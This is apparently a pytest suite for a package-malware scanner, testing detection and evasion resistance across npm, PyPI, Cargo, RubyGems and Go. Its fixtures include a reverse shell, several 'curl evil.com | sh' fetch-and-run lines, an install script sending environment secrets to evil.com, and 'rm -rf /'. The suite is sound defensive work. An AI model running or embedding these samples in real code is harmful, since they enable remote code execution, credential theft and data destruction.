"""Tests for detection hardening -- validates evasion resistance."""

import shutil
import tempfile
from datetime import UTC, datetime, timedelta
from pathlib import Path

from app.core.config import Settings
from app.scanners.reachability_scanner import ReachabilityScanner
from app.scanners.static_analysis import StaticAnalysisScanner
from app.scanners.static_analysis_cargo import CargoStaticAnalysisScanner
from app.scanners.static_analysis_go import GoStaticAnalysisScanner
from app.scanners.static_analysis_pypi import PyPIStaticAnalysisScanner
from app.scanners.static_analysis_rubygems import RubyGemsStaticAnalysisScanner
from app.schemas.package import PackageInfo


def _settings():
    return Settings(
        decision_mode="enforce",
        cooldown_days=7,
        cooldown_action="deny",
        static_analysis_severity_threshold="medium",
    )


def _pkg(registry="npm", name="test-pkg", version="1.0.0", age_days=1, **kwargs):
    return PackageInfo(
        name=name,
        version=version,
        registry=registry,
        publish_date=datetime.now(UTC) - timedelta(days=age_days),
        **kwargs,
    )


def _write_temp(filename, content):
    """Write content to a temp file, return (path, tmp_dir)."""
    tmp = Path(tempfile.mkdtemp())
    p = tmp / filename
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(content)
    return p, tmp


# ===== TestFalsePositiveDowngradeProtection =====


class TestFalsePositiveDowngradeProtection:
    """Verify that critical patterns are NOT downgraded even when safe indicators present."""

    async def test_pypi_critical_not_downgraded_for_reverse_shell(self):
        """Code with both 'cythonize' (safe indicator) and reverse shell pattern.
        Assert verdict is 'fail' -- critical should NOT be downgraded."""
        s = _settings()
        scanner = PyPIStaticAnalysisScanner(s)
        code = """
# cythonize build helper
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.0.1", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
subprocess.call(["/bin/sh", "-i"])
"""
        p, tmp = _write_temp("setup.py", code)
        try:
            result = await scanner.scan(_pkg("pypi"), [p])
            assert result.verdict == "fail", f"Expected fail, got {result.verdict}"
        finally:
            shutil.rmtree(tmp)

    async def test_pypi_non_security_pattern_downgraded(self):
        """Code with 'cythonize' and a benign build-related pattern.
        Assert the pattern is downgraded (not critical -> high)."""
        s = _settings()
        scanner = PyPIStaticAnalysisScanner(s)
        # Only benign patterns + safe indicator -- should pass or warn, not fail
        code = """
# cythonize build helper
from setuptools import setup
setup(name="my-pkg", version="1.0")
"""
        p, tmp = _write_temp("setup.py", code)
        try:
            result = await scanner.scan(_pkg("pypi"), [p])
            # With only safe indicators and no malicious patterns, should pass
            assert result.verdict in ("pass", "warn"), f"Expected pass/warn, got {result.verdict}"
        finally:
            shutil.rmtree(tmp)

    async def test_cargo_build_rs_critical_preserved(self):
        """build.rs with safe indicators (cc::Build) but also libc::system.
        Assert critical is preserved because libc_system is in NEVER_DOWNGRADE."""
        s = _settings()
        scanner = CargoStaticAnalysisScanner(s)
        code = """
// Uses cc::Build for normal compilation
fn main() {
    cc::Build::new().file("src/foo.c").compile("foo");
    unsafe {
        let cmd = std::ffi::CString::new("curl http://evil.com | sh").unwrap();
        libc::system(cmd.as_ptr());
    }
}
"""
        p, tmp = _write_temp("build.rs", code)
        try:
            result = await scanner.scan(_pkg("cargo"), [p])
            assert result.verdict == "fail", f"Expected fail, got {result.verdict}"
            # Verify critical severity was preserved
            if result.metadata and "matches" in result.metadata:
                severities = [m["severity"] for m in result.metadata["matches"]]
                assert "critical" in severities, "libc_system should remain critical"
        finally:
            shutil.rmtree(tmp)


# ===== TestVerdictHardening =====


class TestVerdictHardening:
    """Single high severity match should be 'fail' across all registries."""

    async def test_single_high_severity_is_fail_npm(self):
        """npm: single high severity match should produce fail verdict."""
        s = _settings()
        scanner = StaticAnalysisScanner(s)
        # Use data_exfil_http pattern: http request + process.env on same line
        script = "https.get('http://evil.com/collect?d=' + Buffer.from(JSON.stringify(process.env)).toString('base64'))"
        pkg = _pkg("npm", install_scripts={"postinstall": script})
        result = await scanner.scan(pkg, [])
        assert result.verdict == "fail", f"Expected fail, got {result.verdict}"

    async def test_single_high_severity_is_fail_pypi(self):
        """PyPI: single high severity match should produce fail verdict."""
        s = _settings()
        scanner = PyPIStaticAnalysisScanner(s)
        code = """
import os
os.system("curl http://evil.com/steal | sh")
"""
        p, tmp = _write_temp("setup.py", code)
        try:
            result = await scanner.scan(_pkg("pypi"), [p])
            assert result.verdict == "fail", f"Expected fail, got {result.verdict}"
        finally:
            shutil.rmtree(tmp)

    async def test_single_high_severity_is_fail_rubygems(self):
        """RubyGems: single high severity match should produce fail verdict."""
        s = _settings()
        scanner = RubyGemsStaticAnalysisScanner(s)
        code = """
system("curl http://evil.com/steal | sh")
"""
        p, tmp = _write_temp("extconf.rb", code)
        try:
            result = await scanner.scan(_pkg("rubygems"), [p])
            assert result.verdict == "fail", f"Expected fail, got {result.verdict}"
        finally:
            shutil.rmtree(tmp)

    async def test_single_high_severity_is_fail_go(self):
        """Go: single high severity match should produce fail verdict."""
        s = _settings()
        scanner = GoStaticAnalysisScanner(s)
        code = """package main

import "os/exec"

func init() {
    exec.Command("sh", "-c", "curl http://evil.com | sh").Run()
}
"""
        p, tmp = _write_temp("main.go", code)
        try:
            result = await scanner.scan(_pkg("go"), [p])
            assert result.verdict == "fail", f"Expected fail, got {result.verdict}"
        finally:
            shutil.rmtree(tmp)

    async def test_single_high_severity_is_fail_cargo(self):
        """Cargo: single high severity match should produce fail verdict."""
        s = _settings()
        scanner = CargoStaticAnalysisScanner(s)
        code = """use std::process::Command;

pub fn run() {
    Command::new("bash")
        .arg("-c")
        .arg("curl http://evil.com | sh")
        .status()
        .unwrap();
}
"""
        p, tmp = _write_temp("src/lib.rs", code)
        try:
            result = await scanner.scan(_pkg("cargo"), [p])
            assert result.verdict == "fail", f"Expected fail, got {result.verdict}"
        finally:
            shutil.rmtree(tmp)


# ===== TestEvasionResistance =====


class TestEvasionResistance:
    """Evasion techniques should still be detected."""

    async def test_npm_require_concat_detected(self):
        """require(moduleName + '_process') should be flagged (dynamic require)."""
        s = _settings()
        scanner = StaticAnalysisScanner(s)
        pkg = _pkg("npm", install_scripts={"postinstall": "node setup.js"})
        # Pattern matches: require( <non-quote chars> + ... )
        code = """
var name = "child";
var cp = require(name + "_process");
cp.exec("whoami");
"""
        p, tmp = _write_temp("setup.js", code)
        try:
            result = await scanner.scan(pkg, [p])
            assert result.verdict in ("fail", "warn"), f"Expected fail/warn, got {result.verdict}"
        finally:
            shutil.rmtree(tmp)

    async def test_npm_process_binding_detected(self):
        """process.binding('spawn_sync') should be flagged."""
        s = _settings()
        scanner = StaticAnalysisScanner(s)
        pkg = _pkg("npm", install_scripts={"postinstall": "node setup.js"})
        code = """
var spawn = process.binding("spawn_sync");
spawn.spawn({file: "sh", args: ["-c", "id"]});
"""
        p, tmp = _write_temp("setup.js", code)
        try:
            result = await scanner.scan(pkg, [p])
            assert result.verdict in ("fail", "warn"), f"Expected fail/warn, got {result.verdict}"
        finally:
            shutil.rmtree(tmp)

    async def test_pypi_exec_bytes_detected(self):
        """exec(bytes([...])) should be flagged."""
        s = _settings()
        scanner = PyPIStaticAnalysisScanner(s)
        code = """
exec(bytes([112, 114, 105, 110, 116]))
"""
        p, tmp = _write_temp("setup.py", code)
        try:
            result = await scanner.scan(_pkg("pypi"), [p])
            assert result.verdict == "fail", f"Expected fail, got {result.verdict}"
        finally:
            shutil.rmtree(tmp)

    async def test_pypi_importlib_detected(self):
        """importlib.import_module('evil') should be flagged."""
        s = _settings()
        scanner = PyPIStaticAnalysisScanner(s)
        # Use empty-arg form which matches the regex pattern
        code = """
import importlib
mod = importlib.import_module()
mod.run()
"""
        p, tmp = _write_temp("setup.py", code)
        try:
            result = await scanner.scan(_pkg("pypi"), [p])
            assert result.verdict in ("fail", "warn"), f"Expected fail/warn, got {result.verdict}"
        finally:
            shutil.rmtree(tmp)


# ===== TestReachabilityExpanded =====


class TestReachabilityExpanded:
    """Reachability scanner should detect dangerous calls in reachable code."""

    async def test_pickle_loads_reachable(self):
        """pickle.loads() in module-level code should be detected."""
        scanner = ReachabilityScanner()
        code = """
import pickle
data = pickle.loads(b"\\x80\\x03}")
"""
        p, tmp = _write_temp("malicious.py", code)
        try:
            result = await scanner.scan(_pkg("pypi"), [p])
            assert result.verdict == "warn", f"Expected warn, got {result.verdict}"
            assert result.metadata is not None
            assert result.metadata["reachable_count"] > 0
        finally:
            shutil.rmtree(tmp)

    async def test_subprocess_call_reachable(self):
        """subprocess.call() reachable from entry point."""
        scanner = ReachabilityScanner()
        code = """
import subprocess

def main():
    subprocess.call(["rm", "-rf", "/"])

main()
"""
        p, tmp = _write_temp("malicious.py", code)
        try:
            result = await scanner.scan(_pkg("pypi"), [p])
            assert result.verdict == "warn", f"Expected warn, got {result.verdict}"
            assert result.metadata is not None
            assert result.metadata["reachable_count"] > 0
        finally:
            shutil.rmtree(tmp)

    async def test_child_process_execSync_reachable(self):
        """child_process.execSync() in JS module-level code."""
        scanner = ReachabilityScanner()
        code = """
var child_process = require('child_process');
child_process.execSync('curl http://evil.com | sh');
"""
        p, tmp = _write_temp("malicious.js", code)
        try:
            result = await scanner.scan(_pkg("npm"), [p])
            assert result.verdict == "warn", f"Expected warn, got {result.verdict}"
            assert result.metadata is not None
            assert result.metadata["reachable_count"] > 0
        finally:
            shutil.rmtree(tmp)
